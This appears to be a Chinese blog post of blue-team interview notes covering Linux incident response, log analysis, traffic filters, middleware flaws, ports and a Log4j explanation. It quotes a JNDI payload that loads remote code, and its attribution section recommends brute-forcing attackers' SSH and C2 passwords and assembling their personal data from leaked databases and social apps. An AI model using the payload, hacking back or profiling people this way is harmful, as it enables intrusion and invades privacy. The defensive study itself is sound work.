+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">• root:x:0:0:root:/root:/bin/bash</span><br><span class="line">• account:password:UID:GID:GECOS:directory:shell • 用户名：密码：用户ID：组ID：用户说明：家目录：登陆之后的 shell • 注意：无密码只允许本机登陆，远程不允许登陆</span><br></pre></td></tr></table></figure>
+
+<p>2.影子文件/etc/shadow</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">•root:$6$oGs1PqhL2p3ZetrE$X7o7bzoouHQVSEmSgsYN5UD4.kMHx6qgbTqwNVC5oOAouXvcjQSt. Ft7ql1WpkopY0UV9ajBwUt1DpYxTCVvI/:16809:0:99999:7:::</span><br><span class="line">• 用户名：加密密码：密码最后一次修改日期：两次密码的修改时间间隔：密码有效期：密码修改到期到的警告天数：密码过期之后的宽限天数：账号失效时间：保留</span><br></pre></td></tr></table></figure>
+
+<p>3.和账号有关的命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">• who 查看当前登录用户（tty 本地登陆 pts 远程登录）</span><br><span class="line">• w 查看系统信息，想知道某一时刻用户的行为</span><br><span class="line">• uptime 查看登陆多久、多少用户，负载状态</span><br></pre></td></tr></table></figure>
+
+<p>4.账号的一些其他命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">• 1、查询特权用户特权用户(uid 为0)</span><br><span class="line">• [root@localhost ~]# awk -F: &#x27;$3==0&#123;print $1&#125;&#x27; /etc/passwd</span><br><span class="line">• 2、查询可以远程登录的帐号信息</span><br><span class="line">• [root@localhost ~]# awk &#x27;/\$1|\$6/&#123;print $1&#125;&#x27; /etc/shadow</span><br><span class="line">• 3、除root帐号外，其他帐号是否存在sudo权限。如非管理需要，普通帐号应删除sudo权限</span><br><span class="line">• [root@localhost ~]# more /etc/sudoers | grep -v &quot;^#\|^$&quot; | grep &quot;ALL=(ALL)&quot; </span><br><span class="line">• 4、禁用或删除多余及可疑的帐号</span><br><span class="line">• usermod -L user 禁用帐号，帐号无法登录，/etc/shadow 第二栏为 ! 开头</span><br><span class="line">• userdel user 删除 user 用户</span><br><span class="line">• userdel -r user 将删除 user 用户，并且将 /home 目录下的 user 目录一并删</span><br><span class="line">除</span><br></pre></td></tr></table></figure>
+
+<h4 id="1-2历史命令"><a href="#1-2历史命令" class="headerlink" title="1.2历史命令"></a>1.2历史命令</h4><p>1.root用户的历史命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">history</span><br></pre></td></tr></table></figure>
+
+<p>2.进入用户目录下，导出历史命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat .bash_history &gt;&gt; history.tx</span><br></pre></td></tr></table></figure>
+
+<h4 id="1-3检查异常端口"><a href="#1-3检查异常端口" class="headerlink" title="1.3检查异常端口"></a>1.3检查异常端口</h4><p>使用netstat网络连接命令，分析可以端口、IP、PID</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -antlp|more</span><br></pre></td></tr></table></figure>
+
+<p>查看pid对应的进程文件路径</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">运行 ls -l /proc/$PID/exe 或 file /proc/$PID/exe（$PID 为对应的 pid 号）</span><br></pre></td></tr></table></figure>
+
+<h4 id="1-4检查异常进程"><a href="#1-4检查异常进程" class="headerlink" title="1.4检查异常进程"></a>1.4检查异常进程</h4><p>使用ps命令，分析进程</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ps aux|grep pid</span><br><span class="line">ps -ef|grep pname</span><br></pre></td></tr></table></figure>
+
+<h4 id="1-5检查开机启动项"><a href="#1-5检查开机启动项" class="headerlink" title="1.5检查开机启动项"></a>1.5检查开机启动项</h4><p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220606215950542.png" alt="image-20220606215950542"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">• 查看运行级别命令</span><br><span class="line">• runlevel</span><br><span class="line">• 系统默认允许级别</span><br><span class="line">• vi /etc/inittab</span><br><span class="line">• id=3：initdefault #系统开机后直接进入哪个运行级别</span><br><span class="line">• 开机启动配置文件</span><br><span class="line">• /etc/rc.local</span><br><span class="line">• /etc/rc.d/rc[0~6].d</span><br><span class="line">• 说明：当我们需要开机启动自己的脚本时，只需要将可执行脚本</span><br><span class="line">丢在 /etc/init.d 目录下，然后在 /etc/rc.d/rc*.d 文件中建立软链接</span><br><span class="line">即可。</span><br></pre></td></tr></table></figure>
+
+<h4 id="1-6检查定时任务"><a href="#1-6检查定时任务" class="headerlink" title="1.6检查定时任务"></a>1.6检查定时任务</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">• 1、利用 crontab 创建计划任务</span><br><span class="line">• 基本命令</span><br><span class="line">• crontab -l 列出某个用户cron服务的详细内容</span><br><span class="line">• Tips：默认编写的crontab文件会保存在 (/var/spool/cron/用户名 例如:</span><br><span class="line">/var/spool/cron/root</span><br><span class="line">• crontab -r 删除每个用户cront任务(谨慎：删除所有的计划任务)</span><br><span class="line">• crontab -e 使用编辑器编辑当前的crontab文件</span><br><span class="line">• 如：*/1 * * * * echo &quot;hello world&quot; &gt;&gt; /tmp/test.txt 每分钟写入文件</span><br></pre></td></tr></table></figure>
+
+<h4 id="重点关注一下目录是否存在恶意脚本"><a href="#重点关注一下目录是否存在恶意脚本" class="headerlink" title="重点关注一下目录是否存在恶意脚本"></a>重点关注一下目录是否存在恶意脚本</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">• /var/spool/cron/*</span><br><span class="line">• /etc/crontab</span><br><span class="line">• /etc/cron.d/*</span><br><span class="line">• /etc/cron.daily/*</span><br><span class="line">• /etc/cron.hourly/*</span><br><span class="line">• /etc/cron.monthly/*</span><br><span class="line">• /etc/cron.weekly/</span><br><span class="line">• /etc/anacrontab</span><br><span class="line">• /var/spool/anacron/*</span><br></pre></td></tr></table></figure>
+
+<h4 id="1-7检查服务"><a href="#1-7检查服务" class="headerlink" title="1.7检查服务"></a>1.7检查服务</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">• 查询已安装的服务：</span><br><span class="line">• RPM 包安装的服务</span><br><span class="line">• chkconfig --list 查看服务自启动状态，可以看到所有的RPM包安装的服务</span><br><span class="line">• ps aux | grep crond 查看当前服务</span><br><span class="line">• 源码包安装的服务</span><br><span class="line">• 查看服务安装位置 ，一般是在/user/local/</span><br><span class="line">• service httpd start</span><br><span class="line">• 搜索/etc/rc.d/init.d/ 查看是否存在</span><br></pre></td></tr></table></figure>
+
+<h4 id="1-8检查异常文件"><a href="#1-8检查异常文件" class="headerlink" title="1.8检查异常文件"></a>1.8检查异常文件</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">• 1、查看敏感目录，如/tmp目录下的文件，同时注意隐藏文件夹，</span><br><span class="line">以“..”为名的文件夹具有隐藏属性</span><br><span class="line">• 2、得到发现WEBSHELL、远控木马的创建时间，如何找出同一时</span><br><span class="line">间范围内创建的文件？</span><br><span class="line">• 可以使用find命令来查找，如 find /opt -iname &quot;*&quot; -atime 1 -type</span><br><span class="line">f 找出 /opt 下一天前访问过的文件</span><br><span class="line">• 3、针对可疑文件可以使用 stat 进行创建修改时间</span><br></pre></td></tr></table></figure>
+
+<h4 id="1-9检查系统日志"><a href="#1-9检查系统日志" class="headerlink" title="1.9检查系统日志"></a>1.9检查系统日志</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">• 日志默认存放位置：/var/log/</span><br><span class="line">• 查看日志配置情况：more /etc/rsyslog.conf</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">日志文件 说明</span><br><span class="line">/var/log/cron 记录了系统定时任务相关的日志</span><br><span class="line">/var/log/cups 记录打印信息的日志</span><br><span class="line">/var/log/dmesg</span><br><span class="line">记录了系统在开机时内核自检的信息，也可以使用dmesg命令直接查</span><br><span class="line">看内核自检信息</span><br><span class="line">/var/log/mailog 记录邮件信息</span><br><span class="line">/var/log/message</span><br><span class="line">记录系统重要信息的日志。这个日志文件中会记录Linux系统的绝大</span><br><span class="line">多数重要信息，如果系统出现问题时，首先要检查的就应该是这个日</span><br><span class="line">志文件</span><br><span class="line">/var/log/btmp</span><br><span class="line">记录错误登录日志，这个文件是二进制文件，不能直接vi查看，而要</span><br><span class="line">使用lastb命令查看</span><br><span class="line">/var/log/lastlog</span><br><span class="line">记录系统中所有用户最后一次登录时间的日志，这个文件是二进制文</span><br><span class="line">件，不能直接vi，而要使用lastlog命令查看</span><br><span class="line">/var/log/wtmp</span><br><span class="line">永久记录所有用户的登录、注销信息，同时记录系统的启动、重启、</span><br><span class="line">关机事件。同样这个文件也是一个二进制文件，不能直接vi，而需要</span><br><span class="line">使用last命令来查看</span><br><span class="line">/var/log/utmp</span><br><span class="line">记录当前已经登录的用户信息，这个文件会随着用户的登录和注销不</span><br><span class="line">断变化，只记录当前登录用户的信息。同样这个文件不能直接vi，而</span><br><span class="line">要使用w,who,users等命令来查询</span><br><span class="line">/var/log/secure</span><br><span class="line">记录验证和授权方面的信息，只要涉及账号和密码的程序都会记录，</span><br><span class="line">比如SSH登录，su切换用户，sudo授权，甚至添加用</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">• 日志分析常用命令：</span><br><span class="line">• 1、定位有多少IP在爆破主机的root帐号：</span><br><span class="line">• grep &quot;Failed password for root&quot; /var/log/secure | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c| sort -nr | more</span><br><span class="line">• 定位有哪些IP在爆破：</span><br><span class="line">• grep &quot;Failed password&quot; /var/log/secure|grep -E -o &quot;(25[0-5]|2[0-4][0-9]|[01]?[0- 9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0- 9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)&quot;|uniq -c</span><br><span class="line">• 爆破用户名字典是什么？</span><br><span class="line">• grep &quot;Failed password&quot; /var/log/secure|perl -e &#x27;while($_=&lt;&gt;)&#123; /for(.*?) from/;</span><br><span class="line">print &quot;$1\n&quot;;&#125;&#x27;|uniq -c|sort -n</span><br><span class="line">• 2、登录成功的IP有哪些：</span><br><span class="line">• grep &quot;Accepted &quot; /var/log/secure | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c| sort -nr | more</span><br><span class="line">• 登录成功的日期、用户名、IP：</span><br><span class="line">• grep &quot;Accepted &quot; /var/log/secure | awk &#x27;&#123;print $1,$2,$3,$9,$11&#125;&#x27;</span><br><span class="line">• 3、增加一个用户kali日志：</span><br><span class="line">• Jul 10 00:12:15 localhost useradd[2382]: new group: name=kali,</span><br><span class="line">GID=1001</span><br><span class="line">• Jul 10 00:12:15 localhost useradd[2382]: new user: name=kali,</span><br><span class="line">UID=1001, GID=1001, home=/home/kali</span><br><span class="line">•, shell=/bin/bash</span><br><span class="line">• Jul 10 00:12:58 localhost passwd: pam_unix(passwd:chauthtok):</span><br><span class="line">password changed for kali</span><br><span class="line">• #grep &quot;useradd&quot; /var/log/secur</span><br><span class="line">• 4、删除用户kali日志：</span><br><span class="line">• Jul 10 00:14:17 localhost userdel[2393]: delete user &#x27;kali&#x27;</span><br><span class="line">• Jul 10 00:14:17 localhost userdel[2393]: removed group &#x27;kali&#x27;</span><br><span class="line">owned by</span><br><span class="line">&#x27;kali&#x27;</span><br><span class="line">• Jul 10 00:14:17 localhost userdel[2393]: removed shadow group &#x27;kali&#x27; owned by&#x27;kali&#x27;</span><br><span class="line">• # grep &quot;userdel&quot; </span><br><span class="line">• 5、su切换用户：</span><br><span class="line">• Jul 10 00:38:13 localhost su: pam_unix(su-l:session): session</span><br><span class="line">opened for user good by root(uid=0)</span><br><span class="line">• sudo授权执行:</span><br><span class="line">• sudo -l</span><br><span class="line">• Jul 10 00:43:09 localhost sudo: good : TTY=pts/4 ;</span><br><span class="line">PWD=/home/good ; USER=root ; COMMAND=/sbin/shutdown -r</span><br><span class="line">now</span><br></pre></td></tr></table></figure>
+
+<p>删除日志：rm log.log</p>
+<h4 id="1-10-dns设置"><a href="#1-10-dns设置" class="headerlink" title="1.10 dns设置"></a>1.10 dns设置</h4><p>vim /etc/named.conf 打开配置文件</p>
+<h4 id="一些常用命令"><a href="#一些常用命令" class="headerlink" title="一些常用命令"></a>一些常用命令</h4><p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220615204521867.png" alt="image-20220615204521867"></p>
+<h3 id="工具介绍"><a href="#工具介绍" class="headerlink" title="工具介绍"></a>工具介绍</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">• 2.1 Rootkit查杀</span><br><span class="line">• Chkrootkit</span><br><span class="line">• 网址：http://www.chkrootkit.org</span><br><span class="line">• Rkhunter</span><br><span class="line">• 网址：http://rkhunter.sourceforge.net</span><br><span class="line">• 2.2 病毒查杀</span><br><span class="line">• Clamav</span><br><span class="line">• 网址：http://www.clamav.net/download.html</span><br><span class="line">• 2.3 webshell查杀</span><br><span class="line">• Linux 版：河马 WebShell 查杀：http://www.shllpub.com</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="应急响应的案例"><a href="#应急响应的案例" class="headerlink" title="应急响应的案例"></a>应急响应的案例</h2><p>一个是之前o佬讲的</p>
+<p>一个是白帽最前沿上面的</p>
+<p>天眼流量哪里来？核心交换机做的端口镜像</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">好像是sxf的态势感知吧</span><br><span class="line">首先你去了有很大可能接触态势感知，这是一个综合研判分析平台，由探针STA来进行流量接入，态势负责分析、阻断攻击，你经常涉及的模块功能有两个，一个是日志检索，一个是重保中心的实时监控</span><br><span class="line"></span><br><span class="line">需要客户给你接入内网或vpn，给你平台地址，浏览器直接接入访问，输入账密登录；登录后，我们找到 &gt;&gt;分析中心-日志检索这里</span><br><span class="line"></span><br><span class="line"> 然后在日志检索这块，可以做一些规则的匹配，筛选，比如只看中高危攻击，还可以根据攻击类型进行日志筛选，这块是对接的第三方设备传入的日志流量，有可能识别的厂商安全设备，比如WAF，这个你不需要管，能看到日志就行，接下来，这个就是我们要看的内容。</span><br><span class="line"> </span><br><span class="line"> 然后是安恒的防火墙</span><br><span class="line"> 在这里顺便带大家学习下如何分析，首先你看时间，如果一分钟内产生多条日志告警，那ok，把IP复制出来，去防火墙进行封禁，防火墙怎么封？啊，这，就是找到安全防护，点击添加黑名单--输入攻击IP--点击确定提交</span><br><span class="line"> 外国的ip直接封</span><br><span class="line"> 看具体的日志内容，比如网站扫描，就看它的数据包，user-agent</span><br><span class="line"> 最后写个表记录</span><br></pre></td></tr></table></figure>
+
+<h1 id="溯源-基本思路"><a href="#溯源-基本思路" class="headerlink" title="溯源(基本思路)"></a>溯源(基本思路)</h1><p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220607005009412.png" alt="image-20220607005009412"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">通过黑客ID进行信息收集：</span><br><span class="line">(1) 百度信息收集：“id” （双引号为英文）</span><br><span class="line">(2) 谷歌信息收集</span><br><span class="line">(3) src信息收集（各大src排行榜）</span><br><span class="line">(4) 微博搜索（如果发现有微博记录，可使用tg查询weibo泄露数据）</span><br><span class="line">(5) 微信ID收集：微信进行ID搜索</span><br><span class="line">(6) 如果获得手机号（可直接搜索支付宝、社交账户等）</span><br><span class="line">注意：获取手机号如果自己查到的信息不多，直接上报工作群（利用共享渠道对其进行二次社工）</span><br><span class="line">(7) 豆瓣/贴吧/知乎/脉脉 你能知道的所有社交平台，进行信息收集</span><br><span class="line">(8) CSDN ID，利用CSDN老用户的一个漏洞，爆破ID手机号</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">溯源整个流程我认为有三个部分。 </span><br><span class="line">1. 攻击源捕获。 2. 溯源信息 3. 输出攻击者画像 ···攻击源的捕获是为了获得攻击者的ip、黑客id、手机号、邮箱等信息。 ···溯源信息是为了定位黑客到具体的人。 ···输出攻击者画像是为了给这个人一个格式化的档案方便下次查找与信息存储。</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220615202911911.png" alt="image-20220615202911911"></p>
+<p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220615203001610.png" alt="image-20220615203001610"></p>
+<h2 id="小思路"><a href="#小思路" class="headerlink" title="小思路"></a>小思路</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.红队攻击都会挂着代理，你溯源的话只能溯源到他的代理ip，没有太大的意义，如果说服务器被上了内存马的情况，可以去工具取样他内存马的ip，对内存马ip反向扫描端口，因为他们也是通过远程进去的，去爆破他们的ssh,3389和cs的密码。</span><br><span class="line"></span><br><span class="line">2.反序列化的取样，他打shiro，里面就有他的基本设备vps，通过中间件吧这些有特征的ip收集，放到在线情报平台上识别，检测是不是有ip绑定域名的，通过whois反查他的域名注册时间、邮箱，通过社工库查他的手机号，然后通过社交软件，qq、微信、支付宝来给他转一毛钱，拼接他的个人信息。</span><br></pre></td></tr></table></figure>
+
+<h2 id="流量溯源"><a href="#流量溯源" class="headerlink" title="流量溯源"></a>流量溯源</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1.先看日志，看攻击时间做一个审计，搜索这个时间文件上传的操作，一般是GET和POST两种，GET的话可以直接看到他请求的资源、地址和content，然后webshell该杀就杀，后门该补就补，如果是POST，那么就看不到请求的内容，可以去防火墙上下载完整数据包来分析。</span><br></pre></td></tr></table></figure>
+
+<h1 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">拿到流量包后将其导入wireshark中，使用过滤规则对流量包进行分析，常用的过滤规则有：</span><br><span class="line">http contains &quot;关键字&quot;</span><br><span class="line">http.response.code == 200</span><br><span class="line">http.request.method == POST</span><br><span class="line">tcp.prot == 80</span><br><span class="line">ip.addr == &quot;10.1.1.1&quot;</span><br><span class="line">ip.src</span><br><span class="line">ip.dst</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="常见中间件漏洞"><a href="#常见中间件漏洞" class="headerlink" title="常见中间件漏洞"></a>常见中间件漏洞</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IIS7.5，apache，nginx，tomcat，weblogic，jboos</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"> 2.1）IIS：</span><br><span class="line"></span><br><span class="line">PUT漏洞</span><br><span class="line">短文件名猜解</span><br><span class="line">远程代码执行</span><br><span class="line">解析漏洞</span><br><span class="line">     2.2）Apache：</span><br><span class="line"></span><br><span class="line">解析漏洞  x.php.jpg</span><br><span class="line">目录遍历</span><br><span class="line">     2.3）Nginx：</span><br><span class="line"></span><br><span class="line">文件解析   x.jpg/.php</span><br><span class="line">目录遍历 </span><br><span class="line">CRLF注入</span><br><span class="line">目录穿越</span><br><span class="line">     2.4）Tomcat： 8080</span><br><span class="line"></span><br><span class="line">远程代码执行</span><br><span class="line">war后门文件部署</span><br><span class="line">     2.5）Jboss：</span><br><span class="line"></span><br><span class="line">反序列化漏洞</span><br><span class="line">war后门文件部署</span><br><span class="line">     2.6）WebLogic：7001 7002</span><br><span class="line"></span><br><span class="line">反序列化漏洞</span><br><span class="line">SSRF</span><br><span class="line">任意文件上传</span><br><span class="line">war后门文件部署</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="常见端口"><a href="#常见端口" class="headerlink" title="常见端口"></a>常见端口</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">数据库类（扫描弱口令）</span><br><span class="line"></span><br><span class="line">1433：MSSQL</span><br><span class="line">1521：Oracle</span><br><span class="line">3306：Mysql</span><br><span class="line">5432：PostgreSQL</span><br><span class="line">特殊服务类（未授权/命令执行）</span><br><span class="line"></span><br><span class="line">3389:远程连接</span><br><span class="line">443：ssl 心脏滴血</span><br><span class="line">873：Rsync 未授权</span><br><span class="line">5984：CouchDB http：//xxx:5984/_utils/</span><br><span class="line">6379：Redis 未授权</span><br><span class="line">7001、7002：Weblogic 默认弱口令</span><br><span class="line">8088：Hadoop Yarn 资源管理系统 REST API 存在未授权</span><br><span class="line">8161：Apache ActiveMQ 未授权、弱口令，put 文件上传，move 文件移动</span><br><span class="line">9200、9300：elasticsearch 命令执行</span><br><span class="line">11211：Memcache 未授权，telnet ip 就可以获得服务器敏感信息</span><br><span class="line">27017、27018：Mongodb 未授权</span><br><span class="line">50000：SAP 命令执行</span><br><span class="line">50070、50030 Hadoop 未授权访问</span><br><span class="line">常用端口类（弱口令/端口爆破）</span><br><span class="line"></span><br><span class="line">21：FTP 弱口令，匿名 anonymous/空登录，以及 ms12-073</span><br><span class="line">25：SMTP 简单邮件传输服务器端口</span><br><span class="line">23：Telnet 的端口，Telnet 是一种可以远程登录并管理远程机器的服务</span><br><span class="line">22：ssh 端口，PcAnywhere 建立 TCP 和这一端口的连接可能是为了寻找 ssh，这一服务有许多弱点</span><br><span class="line">53：dns 端口</span><br><span class="line">139：属于 TCP 协议，是为 NetBIOS Session Service 提供的，主要提供 Windows 文件和打印机共享以及 Unix 中的 Samba 服务</span><br><span class="line">445：网络共享 smb 服务，尝试利用 ms08067，ms17010 等以及 IPC$ 攻击手段</span><br><span class="line">2601、2604：zebra 路由，默认密码 zebra</span><br></pre></td></tr></table></figure>
+
+<h1 id="冰蝎的特点"><a href="#冰蝎的特点" class="headerlink" title="冰蝎的特点"></a>冰蝎的特点</h1><p>冰蝎其最大特点就是对交互流量进行AES对称加密，且加密秘钥是由随机数函数动态生成，因此该客户端的流量几乎无法检测。</p>
+<h1 id="log4j的原理以及一些payload"><a href="#log4j的原理以及一些payload" class="headerlink" title="log4j的原理以及一些payload"></a>log4j的原理以及一些payload</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Log4j2漏洞总的来说就是：因为Log4j2默认支持解析ldap/rmi协议，并会通过名称从ldap服务端其获取对应的Class文件，并使用ClassLoader在本地加载Ldap服务端返回的Class类。这就为攻击者提供了攻击途径，攻击者可以在界面传入一个包含恶意内容（会提供一个恶意的Class文件）的ldap协议内容（如：恶意内容$&#123;jndi:ldap://localhost:9999/Test&#125;恶意内容），该内容传递到后端被log4j2打印出来，就会触发恶意的Class的加载执行（可执行任意后台指令），从而达到攻击的目的。</span><br></pre></td></tr></table></figure>
+
